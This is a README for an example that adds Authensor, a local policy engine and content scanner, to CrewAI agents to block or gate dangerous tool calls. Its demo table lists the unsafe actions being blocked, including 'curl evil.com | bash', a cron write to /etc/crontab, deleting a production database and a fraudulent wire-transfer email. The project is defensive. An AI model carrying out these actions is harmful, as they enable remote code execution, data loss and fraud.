# CrewAI + Authensor

Add Authensor to CrewAI in 3 lines. Free, open-source agent safety.

## The Problem

CrewAI lets your agents call tools autonomously -- but there's no built-in way to control which tools are safe, block dangerous actions, or require human approval for sensitive operations.

## The Solution

```python
from authensor_guard import PolicyEngine, ContentScanner, authensor_guard

engine = PolicyEngine(policy)          # 1. Load policy
scanner = ContentScanner()             # 2. Create scanner

@authensor_guard(engine, scanner)      # 3. Decorate your tools
def my_tool(arg: str) -> str:
    ...
```

No API server. No API keys. No network calls. Pure local evaluation.

## Quick Start

```bash
cd examples/crewai-agent
pip install pyyaml

# See what happens WITHOUT safety guardrails
python demo_unsafe.py

# See the same agent WITH Authensor
python demo.py

# Run the agent skeleton template
python agent.py
```

## What the Demo Shows

### `python demo_unsafe.py` -- No Guardrails

An agent with 5 tool calls, all executed without any checks:

| Tool | What Happens |
|------|-------------|
| `search_web` | Executes (fine) |
| `write_file` | Writes a cron job to `/etc/crontab` |
| `delete_database` | Deletes `production_users` |
| `send_email` | Sends a fraudulent wire transfer email to the CFO |
| `run_shell_command` | Runs `curl evil.com \| bash` |

### `python demo.py` -- With Authensor

Same 5 tool calls, but each goes through Authensor's policy engine:

| Tool | Decision | Why |
|------|----------|-----|
| `search_web` | ALLOWED | Read-only, safe |
| `write_file` | DENIED | Content scanner detected shell injection in cron job |
| `delete_database` | DENIED | Destructive database operations blocked |
| `send_email` | NEEDS APPROVAL | Outbound messages require human review |
| `run_shell_command` | DENIED | Content scanner + policy both block shell execution |

Every decision produces a hash-chained audit receipt.

## Integration Pattern

### With CrewAI

```python
from crewai import Agent, Task, Crew
from crewai_tools import tool

# Load Authensor
engine = PolicyEngine(yaml.safe_load(open("policy.yaml")))
scanner = ContentScanner()

@tool
@authensor_guard(engine, scanner)
def search_web(query: str) -> str:
    """Search the web for information."""
    return requests.get(f"https://api.search.com?q={query}").text

@tool
@authensor_guard(engine, scanner)
def write_file(path: str, content: str) -> str:
    """Write content to a file."""
    with open(path, "w") as f:
        f.write(content)
    return f"Written to {path}"

agent = Agent(
    role="Research Assistant",
    goal="Find and summarize information safely",
    tools=[search_web, write_file],
)

task = Task(
    description="Research AI safety and write a summary",
    agent=agent,
)

crew = Crew(agents=[agent], tasks=[task])
crew.kickoff()
```

If the agent tries to call a denied tool, Authensor raises `PermissionError` and the agent receives the denial as a tool error -- it can then choose a different approach.

### With Authensor Python SDK (Hosted)

For centralized policy management, audit storage, and a dashboard:

```python
from authensor import AuthensorClient, AuthensorGuard

client = AuthensorClient(
    base_url="https://cp.authensor.dev",
    api_key=os.environ["AUTHENSOR_API_KEY"],
)
guard = AuthensorGuard(client, agent_id="my-crewai-agent")

@guard
async def send_payment(amount: int, currency: str) -> dict:
    return await stripe.charges.create(amount=amount, currency=currency)
```

## Policy Format

Policies are declarative YAML. See `policy.yaml` for the full example.

```yaml
id: my-policy
name: Agent Safety Policy
version: "1.0.0"

rules:
  - id: allow-search
    effect: allow
    condition:
      field: action.type
      operator: eq
      value: agent.search_web

  - id: deny-shell
    effect: deny
    condition:
      field: action.type
      operator: eq
      value: agent.run_shell_command

defaultEffect: deny   # fail-closed
```

## What You Get

- **Policy engine**: Declarative YAML rules, sub-millisecond evaluation
- **Content scanner**: Detects shell injection, SQL injection, credentials, PII
- **Audit receipts**: Hash-chained, tamper-evident decision log
- **Fail-closed**: No policy = deny. No ambiguity.
- **Framework agnostic**: Works with CrewAI, LangChain, AutoGen, or plain Python

## Links

- [Authensor GitHub](https://github.com/authensor/authensor)
- [Python SDK docs](https://docs.authensor.com/sdk/python)
- [Policy reference](https://docs.authensor.com/policies)
